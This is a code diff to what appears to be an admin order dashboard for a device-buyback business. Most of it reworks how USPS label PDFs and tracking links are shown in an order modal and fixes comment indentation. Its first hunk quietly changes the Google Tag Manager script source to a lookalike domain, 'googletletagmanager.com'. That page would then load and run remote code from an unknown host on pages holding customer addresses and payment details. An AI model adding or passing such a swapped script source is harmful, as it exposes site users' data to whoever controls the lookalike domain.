@@ -10,7 +10,7 @@
 <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
 new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
 j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
-'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+'https://www.googletletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
 })(window,document,'script','dataLayer','GTM-W3BM2JC8');</script>
 <!-- End Google Tag Manager -->
     <!-- Google tag (gtag.js) -->
@@ -528,10 +528,10 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
         const USPS_TRACKING_URL = 'https://tools.usps.com/go/TrackConfirmAction?qtc_tLabels1=';
 
         /**
-          * Converts a Firestore Timestamp object or Date into a string formatted as "Month Day, Year".
-          * @param {Object|Date} timestamp - The Firestore Timestamp object, Date object, or timestamp string.
-          * @returns {string} Formatted date string (e.g., 'October 24, 2024').
-          */
+         * Converts a Firestore Timestamp object or Date into a string formatted as "Month Day, Year".
+         * @param {Object|Date} timestamp - The Firestore Timestamp object, Date object, or timestamp string.
+         * @returns {string} Formatted date string (e.g., 'October 24, 2024').
+         */
         function formatDate(timestamp) {
             if (!timestamp) return 'N/A';
             
@@ -625,8 +625,8 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
                     <td class="px-3 py-4 whitespace-normal text-sm text-gray-500">${itemDescription}</td>
                     <td class="px-3 py-4 whitespace-normal text-sm">
                         <span class="${getStatusClass(order.status)}">
-                           <span class="status-bubble-text">${statusText}</span>
-                           ${reofferTimer}
+                            <span class="status-bubble-text">${statusText}</span>
+                            ${reofferTimer}
                         </span>
                     </td>
                     <td class="px-3 py-4 whitespace-normal text-sm text-gray-500">${trackingCellContent}</td>
@@ -646,9 +646,9 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
         }
 
         /**
-          * Formats the order status text for display in the dashboard.
-          * @param {Object} order - The order object.
-          */
+         * Formats the order status text for display in the dashboard.
+         * @param {Object} order - The order object.
+         */
         function formatStatus(order) {
             const status = order.status;
             const preference = order.shippingPreference;
@@ -708,6 +708,11 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
             
             // NEW: Hide reminder button by default
             sendReminderBtn.classList.add('hidden');
+            
+            // Reset modal link texts to default for consistency
+            modalLabelLink.textContent = 'View Label';
+            modalSecondaryLabelLink.textContent = 'View Label';
+            modalReturnLabelLink.textContent = 'View Return Label';
 
             orderDetailsModal.classList.remove('hidden');
 
@@ -766,68 +771,72 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
                     sendReminderBtn.classList.add('hidden');
                 }
 
-                // --- START: UPDATED LABEL LOGIC FOR USPS HYPERLINKING IN MODAL ---
+                // --- START: UPDATED LABEL LOGIC TO PRIORITIZE LABEL URL ---
                 
-                // 1. Outbound Kit (if requested)
+                // 1. Shipping Kit Requested (Outbound and Inbound)
                 if (order.shippingPreference === 'Shipping Kit Requested') {
                     
-                    // Outbound Label (Kit)
-                    if (order.outboundTrackingNumber) {
-                        modalLabelLink.href = USPS_TRACKING_URL + order.outboundTrackingNumber;
-                        modalTrackingNumber.textContent = order.outboundTrackingNumber;
-                        modalLabelDescription.textContent = 'Outbound Kit Tracking';
-                        modalLabelRow.classList.remove('hidden');
-                    } else if (order.outboundLabelUrl) {
-                        // Fallback: if no tracking number, but PDF link exists
+                    // A. Outbound Label (Kit)
+                    if (order.outboundLabelUrl) { // 1. Prioritize Label URL for View Label Link
                         modalLabelLink.href = order.outboundLabelUrl;
-                        modalTrackingNumber.textContent = 'N/A';
-                        modalLabelDescription.textContent = 'Outbound Kit Label (PDF)';
+                        modalLabelDescription.textContent = 'Outbound Kit Label';
+                        modalLabelLink.textContent = 'View Label PDF'; // Change link text for clarity
+                        modalTrackingNumber.textContent = order.outboundTrackingNumber || 'N/A';
+                        modalLabelRow.classList.remove('hidden');
+                    } else if (order.outboundTrackingNumber) { // 2. Fallback to Tracking Link
+                        modalLabelLink.href = USPS_TRACKING_URL + order.outboundTrackingNumber;
+                        modalLabelDescription.textContent = 'Outbound Kit Tracking';
+                        modalLabelLink.textContent = 'View Tracking'; // Change link text for clarity
+                        modalTrackingNumber.textContent = order.outboundTrackingNumber;
                         modalLabelRow.classList.remove('hidden');
                     }
 
-                    // Inbound Label (Device)
-                    if (order.inboundTrackingNumber) {
-                        modalSecondaryLabelLink.href = USPS_TRACKING_URL + order.inboundTrackingNumber;
-                        modalSecondaryTrackingNumberDisplay.textContent = order.inboundTrackingNumber;
-                        modalSecondaryLabelDescription.textContent = 'Inbound Device Tracking';
-                        modalSecondaryLabelRow.classList.remove('hidden');
-                    } else if (order.inboundLabelUrl) {
-                           // Fallback: if no tracking number, but PDF link exists
+                    // B. Inbound Label (Device)
+                    if (order.inboundLabelUrl) { // 1. Prioritize Label URL for View Label Link
                         modalSecondaryLabelLink.href = order.inboundLabelUrl;
-                        modalSecondaryTrackingNumberDisplay.textContent = 'N/A';
-                        modalSecondaryLabelDescription.textContent = 'Inbound Device Label (PDF)';
+                        modalSecondaryLabelDescription.textContent = 'Inbound Device Label';
+                        modalSecondaryLabelLink.textContent = 'View Label PDF'; // Change link text for clarity
+                        modalSecondaryTrackingNumberDisplay.textContent = order.inboundTrackingNumber || 'N/A';
+                        modalSecondaryLabelRow.classList.remove('hidden');
+                    } else if (order.inboundTrackingNumber) { // 2. Fallback to Tracking Link
+                        modalSecondaryLabelLink.href = USPS_TRACKING_URL + order.inboundTrackingNumber;
+                        modalSecondaryLabelDescription.textContent = 'Inbound Device Tracking';
+                        modalSecondaryLabelLink.textContent = 'View Tracking'; // Change link text for clarity
+                        modalSecondaryTrackingNumberDisplay.textContent = order.inboundTrackingNumber;
                         modalSecondaryLabelRow.classList.remove('hidden');
                     }
                 
                 }
                 
-                // 2. Email Label Requested (single USPS label/inbound label)
+                // 2. Email Label Requested (Single Label)
                 else if (order.shippingPreference === 'Email Label Requested') {
-                    if (order.trackingNumber) {
-                        modalLabelLink.href = USPS_TRACKING_URL + order.trackingNumber;
-                        modalTrackingNumber.textContent = order.trackingNumber;
-                        modalLabelDescription.textContent = 'Shipping Label Tracking';
-                        modalLabelRow.classList.remove('hidden');
-                    } else if (order.uspsLabelUrl) {
-                        // Fallback: if no tracking number, but PDF link exists
+                    if (order.uspsLabelUrl) { // 1. Prioritize Label URL
                         modalLabelLink.href = order.uspsLabelUrl;
-                        modalTrackingNumber.textContent = 'N/A';
-                        modalLabelDescription.textContent = 'Shipping Label (PDF)';
+                        modalLabelDescription.textContent = 'Shipping Label';
+                        modalLabelLink.textContent = 'View Label PDF'; // Change link text for clarity
+                        modalTrackingNumber.textContent = order.trackingNumber || 'N/A';
+                        modalLabelRow.classList.remove('hidden');
+                    } else if (order.trackingNumber) { // 2. Fallback to Tracking Link
+                        modalLabelLink.href = USPS_TRACKING_URL + order.trackingNumber;
+                        modalLabelDescription.textContent = 'Shipping Label Tracking';
+                        modalLabelLink.textContent = 'View Tracking'; // Change link text for clarity
+                        modalTrackingNumber.textContent = order.trackingNumber;
                         modalLabelRow.classList.remove('hidden');
                     }
                 }
 
                 // 3. Return Label (For re-offer declines)
-                if (order.returnTrackingNumber) {
-                    modalReturnLabelLink.href = USPS_TRACKING_URL + order.returnTrackingNumber;
-                    modalReturnTrackingNumberDisplay.textContent = order.returnTrackingNumber;
-                    modalReturnLabelDescription.textContent = 'Return Label Tracking';
-                    modalReturnLabelRow.classList.remove('hidden');
-                } else if (order.returnLabelUrl) {
-                    // Fallback to raw PDF link
+                if (order.returnLabelUrl) { // 1. Prioritize Label URL
                     modalReturnLabelLink.href = order.returnLabelUrl;
-                    modalReturnTrackingNumberDisplay.textContent = 'N/A';
-                    modalReturnLabelDescription.textContent = 'Return Label (PDF)';
+                    modalReturnLabelDescription.textContent = 'Return Label';
+                    modalReturnLabelLink.textContent = 'View Return PDF'; // Change link text for clarity
+                    modalReturnTrackingNumberDisplay.textContent = order.returnTrackingNumber || 'N/A';
+                    modalReturnLabelRow.classList.remove('hidden');
+                } else if (order.returnTrackingNumber) { // 2. Fallback to Tracking Link
+                    modalReturnLabelLink.href = USPS_TRACKING_URL + order.returnTrackingNumber;
+                    modalReturnLabelDescription.textContent = 'Return Tracking';
+                    modalReturnLabelLink.textContent = 'View Return Tracking'; // Change link text for clarity
+                    modalReturnTrackingNumberDisplay.textContent = order.returnTrackingNumber;
                     modalReturnLabelRow.classList.remove('hidden');
                 }
                 
@@ -908,9 +917,9 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
         }
 
         /**
-          * Shows the form for manual tracking number input.
-          * @param {Object} order The current order object.
-          */
+         * Shows the form for manual tracking number input.
+         * @param {Object} order The current order object.
+         */
         function showManualFulfillmentForm(order) {
             modalActionButtons.classList.add('hidden');
             manualFulfillmentFormContainer.classList.remove('hidden');
@@ -1144,8 +1153,8 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 
         function generatePaymentLink(order) {
             const amount = order.reOffer?.newPrice
-                                ? order.reOffer.newPrice.toFixed(2)
-                                : (order.estimatedQuote ? order.estimatedQuote.toFixed(2) : '0.00');
+                                        ? order.reOffer.newPrice.toFixed(2)
+                                        : (order.estimatedQuote ? order.estimatedQuote.toFixed(2) : '0.00');
             const customerName = order.shippingInfo ? order.shippingInfo.fullName : 'Customer';
             const venmoUsername = order.paymentDetails?.venmoUsername;
 
